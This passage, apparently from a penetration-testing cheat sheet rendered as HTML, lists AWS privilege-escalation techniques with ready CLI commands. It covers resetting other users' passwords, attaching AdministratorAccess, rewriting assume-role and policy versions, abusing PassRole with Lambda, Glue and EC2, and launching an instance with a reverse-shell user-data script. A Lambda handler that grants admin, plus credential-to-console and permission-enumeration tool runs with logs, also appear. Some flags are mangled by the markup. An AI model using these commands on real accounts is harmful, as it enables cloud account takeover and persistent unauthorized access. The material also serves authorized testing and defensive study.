    <div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="n">create-login-profile</span> <span class="err"></span><span class="n">user-name</span> <span class="n">target_user</span> <span class="err"></span><span class="n">password</span> <span class="s1">&#39;|[3rxYGGl3@`~68)O{,-$1BzKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z,jJ[iT-D^(&#39;</span> <span class="err"></span><span class="n">no-password-reset-required</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:UpdateLoginProfile</strong> : reset other IAM users login passwords.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="nb">update-login</span><span class="n">-profile</span> <span class="err"></span><span class="n">user-name</span> <span class="n">target_user</span> <span class="err"></span><span class="n">password</span> <span class="s1">&#39;|[3rxYGGl3@`~68)O{,-$1BzKejZZ.X1;6T}&lt;XT5isoE=LB2L^G@{uK&gt;f;/CQQeXSo&gt;}th)KZ7v?\\hq.#@dh49=fT;|,lyTKOLG7J[qH$LV5U&lt;9`O~Z,jJ[iT-D^(&#39;</span> <span class="err"></span><span class="n">no-password-reset-required</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:AttachUserPolicy</strong>, <strong>iam:AttachGroupPolicy</strong> or <strong>iam:AttachRolePolicy</strong> : attach existing admin policy to any other entity he currently possesses
    <div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="n">attach-user-policy</span> <span class="err"></span><span class="n">user-name</span> <span class="n">my_username</span> <span class="err"></span><span class="n">policy-arn</span> <span class="n">arn</span><span class="p">:</span><span class="n">aws</span><span class="p">:</span><span class="n">iam</span><span class="p">::</span><span class="n">aws</span><span class="p">:</span><span class="n">policy</span><span class="p">/</span><span class="n">AdministratorAccess</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="n">attach-user-policy</span> <span class="err"></span><span class="n">user-name</span> <span class="n">my_username</span> <span class="err"></span><span class="n">policy-arn</span> <span class="n">arn</span><span class="p">:</span><span class="n">aws</span><span class="p">:</span><span class="n">iam</span><span class="p">::</span><span class="n">aws</span><span class="p">:</span><span class="n">policy</span><span class="p">/</span><span class="n">AdministratorAccess</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="n">attach-role-policy</span> <span class="err"></span><span class="n">role-name</span> <span class="n">role_i_can_assume</span> <span class="err"></span><span class="n">policy-arn</span> <span class="n">arn</span><span class="p">:</span><span class="n">aws</span><span class="p">:</span><span class="n">iam</span><span class="p">::</span><span class="n">aws</span><span class="p">:</span><span class="n">policy</span><span class="p">/</span><span class="n">AdministratorAccess</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:PutUserPolicy</strong>, <strong>iam:PutGroupPolicy</strong> or <strong>iam:PutRolePolicy</strong> : added inline policy will allow the attacker to grant additional privileges to previously compromised entities.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="n">put-user-policy</span> <span class="err"></span><span class="n">user-name</span> <span class="n">my_username</span> <span class="err"></span><span class="n">policy-name</span> <span class="n">my_inline_policy</span> <span class="err"></span><span class="n">policy-document</span> <span class="n">file</span><span class="p">://</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">administrator</span><span class="p">/</span><span class="n">policy</span><span class="p">.</span><span class="n">json</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:CreatePolicy</strong> : add a stealthy admin policy</p>
</li>
<li>
<p><strong>iam:AddUserToGroup</strong> : add into the admin group of the organization.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="nb">add-user</span><span class="n">-to-group</span> <span class="err"></span><span class="nb">group-name</span> <span class="n">target_group</span> <span class="err"></span><span class="n">user-name</span> <span class="n">my_username</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:UpdateAssumeRolePolicy</strong> + <strong>sts:AssumeRole</strong> : change the assuming permissions of a privileged role and then assume it with a non-privileged account.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="nb">update-assume</span><span class="n">-role-policy</span> <span class="err"></span><span class="n">role-name</span> <span class="n">role_i_can_assume</span> <span class="err"></span><span class="n">policy-document</span> <span class="n">file</span><span class="p">://</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">assume</span><span class="p">/</span><span class="n">role</span><span class="p">/</span><span class="n">policy</span><span class="p">.</span><span class="n">json</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:CreatePolicyVersion</strong> &amp; <strong>iam:SetDefaultPolicyVersion</strong> : change customer-managed policies and change a non-privileged entity to be a privileged one.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="n">create-policy-version</span> <span class="err"></span><span class="n">policy-arn</span> <span class="n">target_policy_arn</span> <span class="err"></span><span class="n">policy-document</span> <span class="n">file</span><span class="p">://</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">administrator</span><span class="p">/</span><span class="n">policy</span><span class="p">.</span><span class="n">json</span> <span class="err"></span><span class="nb">set-as</span><span class="n">-default</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">iam</span> <span class="nb">set-default</span><span class="n">-policy-version</span> <span class="err"></span><span class="n">policy-arn</span> <span class="n">target_policy_arn</span> <span class="err"></span><span class="n">version-id</span> <span class="n">v2</span>
</code></pre></div></p>
</li>
<li>
<p><strong>lambda:UpdateFunctionCode</strong> : give an attacker access to the privileges associated with the Lambda service role that is attached to that function.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">lambda</span> <span class="nb">update-function</span><span class="n">-code</span> <span class="err"></span><span class="k">function</span><span class="n">-name</span> <span class="n">target_function</span> <span class="err"></span><span class="n">zip</span><span class="o">-file</span> <span class="n">fileb</span><span class="p">://</span><span class="n">my</span><span class="p">/</span><span class="n">lambda</span><span class="p">/</span><span class="n">code</span><span class="p">/</span><span class="n">zipped</span><span class="p">.</span><span class="n">zip</span>
</code></pre></div></p>
</li>
<li>
<p><strong>glue:UpdateDevEndpoint</strong> : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">glue</span> <span class="err"></span><span class="n">endpoint-name</span> <span class="n">target_endpoint</span> <span class="err"></span><span class="n">public-key</span> <span class="n">file</span><span class="p">://</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">my</span><span class="p">/</span><span class="n">public</span><span class="p">/</span><span class="n">ssh</span><span class="p">/</span><span class="n">key</span><span class="p">.</span><span class="n">pub</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:PassRole</strong> + <strong>ec2:CreateInstanceProfile</strong>/<strong>ec2:AddRoleToInstanceProfile</strong> : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses.</p>
</li>
<li>
<p><strong>iam:PassRole</strong> + <strong>ec2:RunInstance</strong> : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c"># add ssh key</span>
<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ec2</span> <span class="n">run-instances</span> <span class="err"></span><span class="n">image-id</span> <span class="n">ami-a4dc46db</span> <span class="err"></span><span class="n">instance-type</span> <span class="n">t2</span><span class="p">.</span><span class="n">micro</span> <span class="err"></span><span class="n">iam-instance-profile</span> <span class="n">Name</span><span class="p">=</span><span class="n">iam-full-access-ip</span> <span class="err"></span><span class="n">key-name</span> <span class="n">my_ssh_key</span> <span class="err"></span><span class="n">security-group-ids</span> <span class="n">sg</span><span class="p">-</span><span class="n">123456</span>
<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="c"># execute a reverse shell</span>
<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ec2</span> <span class="n">run-instances</span> <span class="err"></span><span class="n">image-id</span> <span class="n">ami-a4dc46db</span> <span class="err"></span><span class="n">instance-type</span> <span class="n">t2</span><span class="p">.</span><span class="n">micro</span> <span class="err"></span><span class="n">iam-instance-profile</span> <span class="n">Name</span><span class="p">=</span><span class="n">iam-full-access-ip</span> <span class="err"></span><span class="n">user-data</span> <span class="n">file</span><span class="p">://</span><span class="n">script</span><span class="p">/</span><span class="n">with</span><span class="p">/</span><span class="n">reverse</span><span class="p">/</span><span class="n">shell</span><span class="p">.</span><span class="n">sh</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:PassRole</strong> + <strong>lambda:CreateFunction</strong> + <strong>lambda:InvokeFunction</strong> : give a user access to the privileges associated with any Lambda service role that exists in the account.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">lambda</span> <span class="n">create-function</span> <span class="err"></span><span class="k">function</span><span class="n">-name</span> <span class="n">my_function</span> <span class="err"></span><span class="n">runtime</span> <span class="n">python3</span><span class="p">.</span><span class="n">6</span> <span class="err"></span><span class="n">role</span> <span class="n">arn_of_lambda_role</span> <span class="err"></span><span class="n">handler</span> <span class="n">lambda_function</span><span class="p">.</span><span class="n">lambda_handler</span> <span class="err"></span><span class="n">code</span> <span class="n">file</span><span class="p">://</span><span class="n">my</span><span class="p">/</span><span class="n">python</span><span class="p">/</span><span class="n">code</span><span class="p">.</span><span class="n">py</span>
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">lambda</span> <span class="n">invoke</span> <span class="err"></span><span class="k">function</span><span class="n">-name</span> <span class="n">my_function</span> <span class="n">output</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
    Example of code.py
    <div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="kn">import</span> <span class="nn">boto3</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>    <span class="n">client</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s1">&#39;iam&#39;</span><span class="p">)</span>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">attach_user_policy</span><span class="p">(</span>
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>    <span class="n">UserName</span><span class="o">=</span><span class="s1">&#39;my_username&#39;</span><span class="p">,</span>
<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>    <span class="n">PolicyArn</span><span class="o">=</span><span class="s2">&quot;arn:aws:iam::aws:policy/AdministratorAccess&quot;</span>
<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>    <span class="p">)</span>
<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>    <span class="k">return</span> <span class="n">response</span>
</code></pre></div></p>
</li>
<li>
<p><strong>iam:PassRole</strong> + <strong>glue:CreateDevEndpoint</strong> : access to the privileges associated with any Glue service role that exists in the account.
    <div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">glue</span> <span class="n">create-dev-endpoint</span> <span class="err"></span><span class="n">endpoint-name</span> <span class="n">my_dev_endpoint</span> <span class="err"></span><span class="n">role-arn</span> <span class="n">arn_of_glue_service_role</span> <span class="err"></span><span class="n">public-key</span> <span class="n">file</span><span class="p">://</span><span class="n">path</span><span class="p">/</span><span class="n">to</span><span class="p">/</span><span class="n">my</span><span class="p">/</span><span class="n">public</span><span class="p">/</span><span class="n">ssh</span><span class="p">/</span><span class="n">key</span><span class="p">.</span><span class="n">pub</span>
</code></pre></div></p>
</li>
</ul>
<h2 id="aws-gaining-aws-console-access-via-api-keys">AWS - Gaining AWS Console Access via API Keys</h2>
<p>A utility to convert your AWS CLI credentials into AWS console access.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="p">$&gt;</span> <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">NetSPI</span><span class="p">/</span><span class="n">aws_consoler</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="p">$&gt;</span> <span class="n">aws_consoler</span> <span class="n">-v</span> <span class="n">-a</span> <span class="n">AKIA</span><span class="no">[REDACTED]</span> <span class="n">-s</span> <span class="no">[REDACTED]</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="n">2020</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">13</span> <span class="n">19</span><span class="p">:</span><span class="n">44</span><span class="p">:</span><span class="n">57</span><span class="p">,</span><span class="n">800</span> <span class="no">[aws_consoler.cli]</span> <span class="n">INFO</span><span class="p">:</span> <span class="n">Validating</span> <span class="n">arguments</span><span class="p">...</span>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="n">2020</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">13</span> <span class="n">19</span><span class="p">:</span><span class="n">44</span><span class="p">:</span><span class="n">57</span><span class="p">,</span><span class="n">801</span> <span class="no">[aws_consoler.cli]</span> <span class="n">INFO</span><span class="p">:</span> <span class="n">Calling</span> <span class="n">logic</span><span class="p">.</span>
<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="n">2020</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">13</span> <span class="n">19</span><span class="p">:</span><span class="n">44</span><span class="p">:</span><span class="n">57</span><span class="p">,</span><span class="n">820</span> <span class="no">[aws_consoler.logic]</span> <span class="n">INFO</span><span class="p">:</span> <span class="n">Boto3</span> <span class="n">session</span> <span class="n">established</span><span class="p">.</span>
<a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="n">2020</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">13</span> <span class="n">19</span><span class="p">:</span><span class="n">44</span><span class="p">:</span><span class="n">58</span><span class="p">,</span><span class="n">193</span> <span class="no">[aws_consoler.logic]</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Creds</span> <span class="n">still</span> <span class="n">permanent</span><span class="p">,</span> <span class="n">creating</span> <span class="n">federated</span> <span class="n">session</span><span class="p">.</span>
<a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="n">2020</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">13</span> <span class="n">19</span><span class="p">:</span><span class="n">44</span><span class="p">:</span><span class="n">58</span><span class="p">,</span><span class="n">698</span> <span class="no">[aws_consoler.logic]</span> <span class="n">INFO</span><span class="p">:</span> <span class="n">New</span> <span class="n">federated</span> <span class="n">session</span> <span class="n">established</span><span class="p">.</span>
<a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="n">2020</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">13</span> <span class="n">19</span><span class="p">:</span><span class="n">44</span><span class="p">:</span><span class="n">59</span><span class="p">,</span><span class="n">153</span> <span class="no">[aws_consoler.logic]</span> <span class="n">INFO</span><span class="p">:</span> <span class="n">Session</span> <span class="n">valid</span><span class="p">,</span> <span class="n">attempting</span> <span class="n">to</span> <span class="n">federate</span> <span class="n">as</span> <span class="n">arn</span><span class="p">:</span><span class="n">aws</span><span class="p">:</span><span class="n">sts</span><span class="p">::</span><span class="n">123456789012</span><span class="p">:</span><span class="n">federated-user</span><span class="p">/</span><span class="n">aws_consoler</span><span class="p">.</span>
<a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="n">2020</span><span class="p">-</span><span class="n">03</span><span class="p">-</span><span class="n">13</span> <span class="n">19</span><span class="p">:</span><span class="n">44</span><span class="p">:</span><span class="n">59</span><span class="p">,</span><span class="n">668</span> <span class="no">[aws_consoler.logic]</span> <span class="n">INFO</span><span class="p">:</span> <span class="n">URL</span> <span class="n">generated</span><span class="p">!</span>
<a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="n">https</span><span class="p">://</span><span class="n">signin</span><span class="p">.</span><span class="n">aws</span><span class="p">.</span><span class="n">amazon</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">federation</span><span class="k">?</span><span class="n">Action</span><span class="p">=</span><span class="n">login</span><span class="p">&amp;</span><span class="n">Issuer</span><span class="p">=</span><span class="n">consoler</span><span class="p">.</span><span class="n">local</span><span class="p">&amp;</span><span class="n">Destination</span><span class="p">=</span><span class="n">https</span><span class="k">%</span><span class="n">3A</span><span class="k">%</span><span class="n">2F</span><span class="k">%</span><span class="n">2Fconsole</span><span class="p">.</span><span class="n">aws</span><span class="p">.</span><span class="n">amazon</span><span class="p">.</span><span class="n">com</span><span class="k">%</span><span class="n">2Fconsole</span><span class="k">%</span><span class="n">2Fhome</span><span class="k">%</span><span class="n">3Fregion</span><span class="k">%</span><span class="n">3Dus-east</span><span class="p">-</span><span class="n">1</span><span class="p">&amp;</span><span class="n">SigninToken</span><span class="p">=[</span><span class="n">REDACTED</span>
</code></pre></div>
<h2 id="aws-enumerate-iam-permissions">AWS - Enumerate IAM permissions</h2>
<p>Enumerate the permissions associated with AWS credential set with <a href="https://github.com/andresriancho/enumerate-iam">enumerate-iam</a></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">git</span><span class="nv">@github</span><span class="p">.</span><span class="n">com</span><span class="p">:</span><span class="n">andresriancho</span><span class="p">/</span><span class="n">enumerate-iam</span><span class="p">.</span><span class="n">git</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="n">pip</span> <span class="n">install</span> <span class="n">-r</span> <span class="n">requirements</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="p">./</span><span class="n">enumerate-iam</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-access-key</span> <span class="n">AKIA</span><span class="p">...</span> <span class="p">-</span><span class="n">-secret-key</span> <span class="n">StF0q</span><span class="p">...</span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="n">2019</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">10</span> <span class="n">15</span><span class="p">:</span><span class="n">57</span><span class="p">:</span><span class="n">58</span><span class="p">,</span><span class="n">447</span> <span class="p">-</span> <span class="n">21345</span> <span class="p">-</span> <span class="no">[INFO]</span> <span class="n">Starting</span> <span class="n">permission</span> <span class="n">enumeration</span> <span class="k">for</span> <span class="n">access-key-id</span> <span class="s2">&quot;AKIA...&quot;</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="n">2019</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">10</span> <span class="n">15</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">01</span><span class="p">,</span><span class="n">532</span> <span class="p">-</span> <span class="n">21345</span> <span class="p">-</span> <span class="no">[INFO]</span> <span class="n">Run</span> <span class="k">for</span> <span class="n">the</span> <span class="n">hills</span><span class="p">,</span> <span class="n">get_account_authorization_details</span> <span class="n">worked</span><span class="p">!</span>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="n">2019</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">10</span> <span class="n">15</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">01</span><span class="p">,</span><span class="n">537</span> <span class="p">-</span> <span class="n">21345</span> <span class="p">-</span> <span class="no">[INFO]</span> <span class="p">--</span> <span class="p">{</span>
<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>    <span class="s2">&quot;RoleDetailList&quot;</span><span class="p">:</span> <span class="p">[</span>
<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>        <span class="p">{</span>
<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>            <span class="s2">&quot;Tags&quot;</span><span class="p">:</span> <span class="p">[],</span>
<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>            <span class="s2">&quot;AssumeRolePolicyDocument&quot;</span><span class="p">:</span> <span class="p">{</span>
<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>                <span class="s2">&quot;Version&quot;</span><span class="p">:</span> <span class="s2">&quot;2008-10-17&quot;</span><span class="p">,</span>
<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>                <span class="s2">&quot;Statement&quot;</span><span class="p">:</span> <span class="p">[</span>
<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>                    <span class="p">{</span>
<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="p">...</span>
<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="n">2019</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">10</span> <span class="n">15</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">26</span><span class="p">,</span><span class="n">709</span> <span class="p">-</span> <span class="n">21345</span> <span class="p">-</span> <span class="no">[INFO]</span> <span class="p">--</span> <span class="n">gamelift</span><span class="p">.</span><span class="n">list_builds</span><span class="p">()</span> <span class="n">worked</span><span class="p">!</span>
<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a><span class="n">2019</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">10</span> <span class="n">15</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">26</span><span class="p">,</span><span class="n">850</span> <span class="p">-</span> <span class="n">21345</span> <span class="p">-</span> <span class="no">[INFO]</span> <span class="p">--</span> <span class="n">cloudformation</span><span class="p">.</span><span class="n">list_stack_sets</span><span class="p">()</span> <span class="n">worked</span><span class="p">!</span>
<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="n">2019</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">10</span> <span class="n">15</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">26</span><span class="p">,</span><span class="n">982</span> <span class="p">-</span> <span class="n">21345</span> <span class="p">-</span> <span class="no">[INFO]</span> <span class="p">--</span> <span class="n">directconnect</span><span class="p">.</span><span class="n">describe_locations</span><span class="p">()</span> <span class="n">worked</span><span class="p">!</span>
<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="n">2019</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">10</span> <span class="n">15</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">27</span><span class="p">,</span><span class="n">021</span> <span class="p">-</span> <span class="n">21345</span> <span class="p">-</span> <span class="no">[INFO]</span> <span class="p">--</span> <span class="n">gamelift</span><span class="p">.</span><span class="n">describe_matchmaking_rule_sets</span><span class="p">()</span> <span class="n">worked</span><span class="p">!</span>
<a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a><span class="n">2019</span><span class="p">-</span><span class="n">05</span><span class="p">-</span><span class="n">10</span> <span class="n">15</span><span class="p">:</span><span class="n">58</span><span class="p">:</span><span class="n">27</span><span class="p">,</span><span class="n">311</span> <span class="p">-</span> <span class="n">21345</span> <span class="p">-</span> <span class="no">[INFO]</span> <span class="p">--</span> <span class="n">sqs</span><span class="p">.</span><span class="n">list_queues</span><span class="p">()</span> <span class="n">worked</span><span class="p">!</span>
</code></pre></div>
<h2 id="aws-mount-ebs-volume-to-ec2-linux">AWS - Mount EBS volume to EC2 Linux</h2>
<p><img alt="" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken.</p>
<ol>
<li>Head over to EC2 &gt; Volumes and create a new volume of your preferred size and type.</li>
<li>Select the created volume, right click and select the "attach volume" option.</li>
<li>Select the instance from the instance text box as shown below : <code>attach ebs volume</code>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">aws</span> <span class="n">ec2</span> <span class="n">create-volume</span> <span class="err"></span><span class="n">snapshot-id</span> <span class="n">snapshot_id</span> <span class="p">-</span><span class="n">-availability-zone</span> <span class="n">zone</span>
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="n">aws</span> <span class="n">ec2</span> <span class="n">attach-volume</span> <span class="err"></span><span class="n">-volume-id</span> <span class="n">volume_id</span> <span class="err"></span><span class="n">-instance-id</span> <span class="n">instance_id</span> <span class="p">-</span><span class="n">-device</span> <span class="n">device</span>
</code></pre></div></li>
<li>Now, login to your ec2 instance and list the available disks using the following command : <code>lsblk</code></li>
<li>Check if the volume has any data using the following command : <code>sudo file -s /dev/xvdf</code></li>
<li>Format the volume to ext4 filesystem  using the following command : <code>sudo mkfs -t ext4 /dev/xvdf</code></li>
<li>Create a directory of your choice to mount our new ext4 volume. I am using the name newvolume : <code>sudo mkdir /newvolume</code></li>
<li>Mount the volume to "newvolume" directory using the following command : <code>sudo mount /dev/xvdf /newvolume/</code></li>
<li>cd into newvolume directory and check the disk space for confirming the volume mount : <code>cd /newvolume; df -h .</code></li>
</ol>
<h2 id="aws-copy-ec2-using-ami-image">AWS - Copy EC2 using AMI Image</h2>
<p>First you need to extract data about the current instances and their AMI/security groups/subnet : <code>aws ec2 describe-images --region eu-west-1</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c"># create a new image for the instance-id</span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ec2</span> <span class="n">create-image</span> <span class="p">-</span><span class="n">-instance-id</span> <span class="n">i</span><span class="p">-</span><span class="n">0438b003d81cd7ec5</span> <span class="p">-</span><span class="n">-name</span> <span class="s2">&quot;AWS Audit&quot;</span> <span class="p">-</span><span class="n">-description</span> <span class="s2">&quot;Export AMI&quot;</span> <span class="p">-</span><span class="n">-region</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span>  
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="c"># add key to AWS</span>
<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="p">$</span> <span class="n">aws</span> <span class="n">ec2</span> <span class="nb">import-key</span><span class="n">-pair</span> <span class="p">-</span><span class="n">-key-name</span> <span class="s2">&quot;AWS Audit&quot;</span> <span class="p">-</span><span class="n">-public-key-material</span> <span class="n">file</span><span class="p">://~/.</span><span class="n">ssh</span><span class="p">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="n">pub</span> <span class="p">-</span><span class="n">-region</span> <span class="n">eu-west</span><span class="p">-</span><span class="n">1</span>  
<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
